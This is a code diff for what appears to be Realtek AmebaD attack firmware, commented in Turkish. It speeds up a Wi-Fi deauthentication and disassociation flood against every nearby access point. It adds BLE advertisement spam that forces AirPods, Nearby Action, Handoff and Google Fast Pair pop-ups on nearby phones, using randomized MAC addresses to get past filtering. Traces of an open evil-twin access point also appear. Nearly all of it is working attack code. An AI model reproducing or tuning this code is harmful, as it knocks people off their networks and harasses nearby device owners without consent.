@@ -14,6 +14,13 @@
 #include "BLEDevice.h"
 #include "BLEAdvertData.h"
 
+// AmebaD BLE gap katmanı — rastgele MAC ve cihaz adı için low-level erişim
+// le_gen_rand_addr / le_set_rand_addr SDK header'larında (gap_le.h) zaten T_GAP_CAUSE ile tanımlı
+// — tekrar bildirmiyoruz, sadece le_adv_set_param eksik olduğu için onu bildiriyoruz
+extern "C" {
+  bool le_adv_set_param(uint8_t param, uint8_t len, void *p_value);
+}
+
 #undef max
 #undef min
 #include <vector>
@@ -246,8 +253,8 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
 #define EXTRA_BURST_COUNT_2G        1
 #define EXTRA_BURST_COUNT_5G        2
 #define EXTRA_BURST_DELAY_MS        10
-#define DEAUTH_FRAME_INTER_DELAY_MS 3
-#define DEAUTH_SKB_BACKOFF_MS       20
+#define DEAUTH_FRAME_INTER_DELAY_MS 0   // Frame arası bekleme kaldırıldı — SKB backoff yeterli
+#define DEAUTH_SKB_BACKOFF_MS       5   // SKB hata recovery: 20ms→5ms
 
 // ═══════════════════════ SCAN PARAMETRELERI (FIX) ═════════════════════════════
 #define SCAN_TIMEOUT_MS             15000   // Scan için timeout
@@ -481,7 +488,7 @@ void scanNetworkTask(void *param) {
     raw_scan_sem = xSemaphoreCreateBinary();
   }
 
-  int scan_ret = wifi_scan_networks(raw_scan_handler, NULL);
+  wifi_scan_networks(raw_scan_handler, NULL);
 
   if (raw_scan_sem != NULL) {
     xSemaphoreTake(raw_scan_sem, pdMS_TO_TICKS(SCAN_RESULT_WAIT_MS));
@@ -810,14 +817,11 @@ void deauthAllTask(void *param) {
 
 
   // ── Deauth All maksimum hız parametreleri ──────────────────────────────────
-  const int DA_FRAME_COUNT_2G   = 20;   // burst başına frame sayısı
-  const int DA_FRAME_COUNT_5G   = 16;
-  const int DA_TASK_DELAY_2G    = 1;    // FreeRTOS minimum tick — CPU'yu bloklamaz
-  const int DA_TASK_DELAY_5G    = 1;
-  const int DA_EXTRA_COUNT_2G   = 6;    // ek burst sayısı
-  const int DA_EXTRA_COUNT_5G   = 8;
-  const int DA_EXTRA_DELAY_MS   = 1;
-  const int DA_CH_SWITCH_MS     = 2;    // minimum kanal geçiş süresi
+  const int DA_FRAME_COUNT_2G   = 6;    // burst başına frame sayısı (daha az → daha hızlı tur)
+  const int DA_FRAME_COUNT_5G   = 5;
+  const int DA_EXTRA_COUNT_2G   = 2;    // ek burst sayısı azaltıldı
+  const int DA_EXTRA_COUNT_5G   = 2;
+  const int DA_CH_SWITCH_MS     = 1;    // minimum kanal geçiş süresi: 2ms→1ms
 
 #define DEAUTH_ALL_RESCAN_INTERVAL_MS 120000UL  // 60s→120s: daha seyrek, saldırıyı az keser
   unsigned long deauth_all_last_scan_ms = 0;
@@ -858,66 +862,60 @@ void deauthAllTask(void *param) {
     }
 
 
-    uint32_t ok_before  = safeSendMgnt_ok_count;
-    uint32_t err_before = safeSendMgnt_err_count;
-
     // ── WiFi Deauth turu ──────────────────────────────────────────────────────
     for (auto &net : snap) {
       if (!deauth_all_active) break;
       if (isFakeAPBSSID(net.bssid)) continue;
 
       bool is5g = (net.channel >= 36);
-      int frameCount  = is5g ? DA_FRAME_COUNT_5G  : DA_FRAME_COUNT_2G;
-      int taskDelay   = is5g ? DA_TASK_DELAY_5G   : DA_TASK_DELAY_2G;
-      int extraBurst  = is5g ? DA_EXTRA_COUNT_5G  : DA_EXTRA_COUNT_2G;
-
-      // Serial print kaldırıldı — her ağda yazdırmak burst hızını düşürürdü
+      int frameCount = is5g ? DA_FRAME_COUNT_5G : DA_FRAME_COUNT_2G;
+      int extraBurst = is5g ? DA_EXTRA_COUNT_5G : DA_EXTRA_COUNT_2G;
 
       wifi_set_channel(net.channel);
-      vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS));
+      vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS)); // kanal stabilizasyon için minimum bekleme
 
+      // ── Ana burst: broadcast + unicast deauth/disassoc ──────────────────────
+      // Per-frame delay yok — safeSendMgnt sadece SKB hata varsa 5ms bekler
       for (int burst = 0; burst < frameCount; burst++) {
         for (int offset = -1; offset <= 1; offset++) {
           uint8_t temp[6];
           memcpy(temp, net.bssid, 6);
           temp[5] = (uint8_t)(temp[5] + offset);
-
           if (isFakeAPBSSID(temp)) continue;
 
+          // Broadcast deauth (reason 7)
           memcpy(&frame[10], temp, 6);
           memcpy(&frame[16], temp, 6);
           memset(&frame[4], 0xFF, 6);
           frame[0] = 0xC0; frame[24] = 0x07;
           safeSendMgnt(frame, 26);
 
+          // Broadcast disassoc (reason 2)
           frame[24] = 0x02;
           safeSendMgnt(frame, 26);
 
+          // Unicast deauth — AP BSSID hedefli
           memcpy(&frame[4], temp, 6);
           frame[0] = 0xC0; frame[24] = 0x07;
           safeSendMgnt(frame, 26);
 
+          // Unicast disassoc
           frame[0] = 0xA0; frame[24] = 0x07;
           safeSendMgnt(frame, 26);
         }
-        vTaskDelay(pdMS_TO_TICKS(taskDelay));
+        // Burst arası delay YOK — taskYIELD ile scheduler'a kısa yol ver
+        taskYIELD();
       }
 
+      // ── Ek broadcast burst — broadcast deauth çift gönder ──────────────────
       for (int extra = 0; extra < extraBurst; extra++) {
-        for (int offset = -1; offset <= 1; offset++) {
-          uint8_t temp[6];
-          memcpy(temp, net.bssid, 6);
-          temp[5] = (uint8_t)(temp[5] + offset);
-          if (!isFakeAPBSSID(temp)) {
-            memcpy(&frame[10], temp, 6);
-            memcpy(&frame[16], temp, 6);
-            memset(&frame[4], 0xFF, 6);
-            frame[0] = 0xC0; frame[24] = 0x07;
-            safeSendMgnt(frame, 26);
-            safeSendMgnt(frame, 26);
-          }
-        }
-        vTaskDelay(pdMS_TO_TICKS(DA_EXTRA_DELAY_MS));
+        memcpy(&frame[10], net.bssid, 6);
+        memcpy(&frame[16], net.bssid, 6);
+        memset(&frame[4], 0xFF, 6);
+        frame[0] = 0xC0; frame[24] = 0x07;
+        safeSendMgnt(frame, 26);
+        safeSendMgnt(frame, 26);
+        taskYIELD();
       }
 
     }
@@ -972,14 +970,23 @@ void bleFloodTask(void *param) {
     0x31  // Not Your Device (uyarı popup)
   };
 
+  // Google Fast Pair şablonu — Android full-screen popup (UUID 0xFE2C + model ID)
+  uint8_t gfp_rnd[5] = { 0x2C, 0xFE, 0x00, 0x00, 0xC9 };
+
+  // Apple Continuity Handoff (0x0C) — ekranlar arası handoff popup
+  uint8_t handoff_rnd[13] = {
+    0x4C,0x00, 0x0C,0x09,         // Apple, Handoff type, len=9
+    0x00,                          // clipboard status
+    0x00,0x00,                     // sequence number — döngüde değişir
+    0x00,0x00,0x00,0x00,0x00,0x00  // auth tag
+  };
+
   while (ble_flood_active) {
-    // ── Profil turu: her profil 150ms yayın yapar ────────────────────────────
-    // BLE adv interval = 0x20 = 20ms → 150ms'de ~7 paket → telefon scan penceresine girer
+    // ── 1. TUR: Tüm profiller — 80ms/profil (adv 0x10=10ms → ~8 paket/profil) ─
     for (int i = 0; i < SPAM_PROFILE_COUNT && ble_flood_active; i++) {
       const BLESpamProfile &p = SPAM_PROFILES[i];
       memcpy(rnd_data, p.data, p.data_len);
       TickType_t t = xTaskGetTickCount();
-      // Her turda auth/token bytes'larını değiştir — duplicate filtresi aşılır
       if (p.is_svc) {
         if (p.data_len > 4) {
           rnd_data[2] = (uint8_t)(t & 0xFF);
@@ -987,7 +994,6 @@ void bleFloodTask(void *param) {
           rnd_data[4] = (uint8_t)(i * 7 + 13);
         }
       } else {
-        // Apple/Samsung/diğer: son 3 byte'ı değiştir (account token bölgesi)
         uint8_t end = p.data_len;
         if (end >= 3) {
           rnd_data[end - 1] = (uint8_t)(t & 0xFF);
@@ -996,31 +1002,64 @@ void bleFloodTask(void *param) {
         }
       }
       bleSetAdv(p.name, rnd_data, p.data_len, p.is_svc);
-      vTaskDelay(pdMS_TO_TICKS(150)); // 150ms = ~7 adv event → kesin algılama
+      vTaskDelay(pdMS_TO_TICKS(80)); // 150ms→80ms: adv 0x10=10ms → 8 event yeterli
     }
 
-    // ── Rastgele Apple Proximity Pairing flood — iOS full-screen popup ───────
-    // Her paket farklı model ID → her biri yeni "AirPods" bağlantı popup'ı açar
-    for (int r = 0; r < 20 && ble_flood_active; r++) {
+    // ── 2. TUR: Rastgele Apple Proximity Pairing — iOS full-screen popup ─────
+    // Her iterasyon farklı rastgele model ID → yeni AirPods popup tetikler
+    for (int r = 0; r < 30 && ble_flood_active; r++) {
       TickType_t t = xTaskGetTickCount();
-      apple_rnd[4] = (uint8_t)((t ^ (r * 37)) & 0xFF); // model_hi
-      apple_rnd[5] = (uint8_t)((t >> 3) & 0xFF);        // model_lo
-      apple_rnd[16] = (uint8_t)(t & 0xFF);               // auth token varyasyon
+      apple_rnd[4]  = (uint8_t)((t ^ (r * 37)) & 0xFF); // model_hi — rastgele
+      apple_rnd[5]  = (uint8_t)((t >> 3) & 0xFF);        // model_lo — rastgele
+      apple_rnd[6]  = (r & 1) ? 0x55 : 0x20;             // kılıf dışı / içi
+      apple_rnd[16] = (uint8_t)(t & 0xFF);
       apple_rnd[17] = (uint8_t)((t >> 8) & 0xFF);
       apple_rnd[18] = (uint8_t)(r * 13);
       bleSetAdv("AirPods", apple_rnd, 27, false);
-      vTaskDelay(pdMS_TO_TICKS(120));
+      vTaskDelay(pdMS_TO_TICKS(70)); // 120ms→70ms
     }
 
-    // ── Nearby Action flood — farklı action type'larla iOS bildirim popup ────
+    // ── 3. TUR: Nearby Action — her action type farklı iOS popup açar ────────
     for (int r = 0; r < 8 && ble_flood_active; r++) {
       TickType_t t = xTaskGetTickCount();
-      action_rnd[5] = ACTION_TYPES[r % 8];    // farklı popup tipi
-      action_rnd[6] = (uint8_t)(t & 0xFF);    // auth tag — rastgele
+      action_rnd[5] = ACTION_TYPES[r];
+      action_rnd[6] = (uint8_t)(t & 0xFF);
       action_rnd[7] = (uint8_t)((t >> 4) & 0xFF);
       action_rnd[8] = (uint8_t)(r * 17 + 3);
       bleSetAdv("Apple Device", action_rnd, 9, false);
-      vTaskDelay(pdMS_TO_TICKS(150));
+      vTaskDelay(pdMS_TO_TICKS(80));
+    }
+
+    // ── 4. TUR: Google Fast Pair — Android full-screen pairing popup ──────────
+    // Model ID'nin son byte'ını değiştir → farklı cihaz gibi görünür
+    static const uint8_t GFP_MODELS[][3] = {
+      {0xC5,0x94,0x18}, // Pixel Buds Pro
+      {0x6D,0x34,0x8A}, // Pixel Buds A
+      {0x82,0xD3,0x87}, // Pixel Watch 2
+      {0x00,0x00,0xC9}, // Fast Pair Dev
+      {0xF5,0x36,0x01}, // Pixel Buds (gen 1)
+      {0x72,0xEF,0x8D}, // Sony WF-1000XM5
+      {0xB3,0x35,0x13}, // Jabra Evolve2
+      {0x10,0x6A,0x42}, // JBL Tune 770
+    };
+    for (int r = 0; r < 8 && ble_flood_active; r++) {
+      TickType_t t = xTaskGetTickCount();
+      gfp_rnd[2] = GFP_MODELS[r][0];
+      gfp_rnd[3] = GFP_MODELS[r][1];
+      gfp_rnd[4] = (uint8_t)(GFP_MODELS[r][2] ^ (t & 0x1F)); // minor varyasyon
+      bleSetAdv("Fast Pair", gfp_rnd, 5, true);
+      vTaskDelay(pdMS_TO_TICKS(70));
+    }
+
+    // ── 5. TUR: Apple Continuity Handoff — ekranlar arası handoff popup ───────
+    for (int r = 0; r < 5 && ble_flood_active; r++) {
+      TickType_t t = xTaskGetTickCount();
+      handoff_rnd[5] = (uint8_t)((t >> r) & 0xFF); // seq hi
+      handoff_rnd[6] = (uint8_t)(t & 0xFF);          // seq lo
+      handoff_rnd[7] = (uint8_t)(r * 31 + 7);
+      handoff_rnd[8] = (uint8_t)((t >> 5) & 0xFF);
+      bleSetAdv("iPhone", handoff_rnd, 13, false);
+      vTaskDelay(pdMS_TO_TICKS(80));
     }
   }
 
@@ -1029,89 +1068,42 @@ void bleFloodTask(void *param) {
   vTaskDelete(NULL);
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// ══════════════════ BLE SONRASI WiFi AP YENİDEN BAŞLATMA ══════════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
-// BLE RF'yi devre dışı bıraktığı için BLE.end() sonrası AP'ı restore ediyoruz.
-static void restoreWiFiAP() {
-
-  dnsServer.stop();
-  delay(50);
-  dhcps_deinit();
-  delay(150);
-
-  wifi_set_mode(RTW_MODE_STA);
-  delay(400);
-  wifi_set_mode(RTW_MODE_STA_AP);
-  delay(400);
-
-  if (ap_switched) {
-    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL,
-                  strlen(target_ssid), 0, (int)target_channel);
-  } else {
-    wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK,
-                  (char *)AP_INITIAL_PASS,
-                  strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
-  }
-  delay(700);
-
-  ip4_addr_t ip, mask, gw;
-  IP4_ADDR(&ip,   192, 168, 4, 1);
-  IP4_ADDR(&mask, 255, 255, 255, 0);
-  IP4_ADDR(&gw,   192, 168, 4, 1);
-  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
-  netif_set_up(&xnetif[1]);
-  netif_set_link_up(&xnetif[1]);
-  delay(150);
-
-  dhcps_init(&xnetif[1]);
-  delay(400);
-
-  dnsServer.begin();
-  delay(100);
-
-  wifi_disable_powersave();
-
-}
-
-
 // is_svc=false → AD type 0xFF (Manufacturer Specific)
 // is_svc=true  → AD type 0x16 (Service Data, ör. Google Fast Pair)
 static void bleSetAdv(const char *name, const uint8_t *data, uint8_t data_len, bool is_svc) {
   BLEAdvert *pAdv = BLE.configAdvert();
   pAdv->stopAdv();
-  vTaskDelay(pdMS_TO_TICKS(5)); // BLE stack'in durmasını bekle
+  vTaskDelay(pdMS_TO_TICKS(3)); // minimum stop bekleme: 8ms→3ms
 
-  if (data_len > 22) data_len = 22; // isim + veri 31 byte sınırına sığsın
+  // ── Rastgele MAC: her çağrı = farklı cihaz ──────────────────────────────
+  uint8_t rand_addr[6];
+  if (le_gen_rand_addr((T_GAP_RAND_ADDR_TYPE)0, rand_addr) == GAP_CAUSE_SUCCESS) {
+    le_set_rand_addr(rand_addr);
+    uint8_t own_addr_type = 1; // GAP_LOCAL_ADDR_LE_RANDOM
+    le_adv_set_param(0x06, sizeof(own_addr_type), &own_addr_type);
+  }
 
-  // ── Primary advertising packet: flags + payload + isim ──────────────────
+  if (data_len > 18) data_len = 18;
+
+  // ── Primary advertising packet ───────────────────────────────────────────
   BLEAdvertData advData;
-  advData.addFlags(0x06); // LE General Discoverable, BR/EDR not supported
+  advData.addFlags(0x06);
 
-  // Manufacturer/Service data
-  uint8_t pkt[24];
+  uint8_t pkt[20];
   pkt[0] = is_svc ? 0x16 : 0xFF;
   memcpy(pkt + 1, data, data_len);
   advData.addData(pkt, data_len + 1);
 
-  // Cihaz adını primary pakete ekle — pasif scanner'lar scan response görmez
-  uint8_t name_len = (uint8_t)strlen(name);
-  if (name_len > 10) name_len = 10; // toplam paket 31 byte'ı aşmasın
-  uint8_t name_pkt[12];
-  name_pkt[0] = 0x09; // Complete Local Name
-  memcpy(name_pkt + 1, name, name_len);
-  advData.addData(name_pkt, name_len + 1);
-
-  // Scan response'u da doldur — aktif scanner'lar tam ismi görsün
+  // ── Scan response: isim ─────────────────────────────────────────────────
   BLEAdvertData scanData;
   scanData.addCompleteName(name);
 
   pAdv->setAdvData(advData);
   pAdv->setScanRspData(scanData);
-  pAdv->setMinInterval(0x20);
-  pAdv->setMaxInterval(0x20);
+  pAdv->setMinInterval(0x10); // 10ms — 0x20(20ms)→0x10: 2× daha fazla paket/sn
+  pAdv->setMaxInterval(0x10);
   pAdv->startAdv();
-  vTaskDelay(pdMS_TO_TICKS(3)); // start'ın tamamlanmasını bekle
+  vTaskDelay(pdMS_TO_TICKS(2)); // minimum start bekleme: 5ms→2ms
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -1604,7 +1596,7 @@ void loop() {
     wifi_set_mode(RTW_MODE_STA_AP);
     delay(400);
 
-    int ret = wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
+    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
 
     delay(700);
 
